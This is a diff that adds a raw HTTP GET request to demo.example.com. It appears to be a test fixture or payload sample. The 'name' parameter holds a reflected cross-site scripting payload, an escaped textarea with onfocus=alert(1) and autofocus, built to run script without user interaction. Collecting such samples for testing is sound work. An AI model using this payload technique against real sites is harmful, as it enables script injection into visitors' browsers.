@@ -1,0 +1,4 @@
+GET /a?name=\u003Ctextarea%20onfocus%3Dalert(1)%20autofocus\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
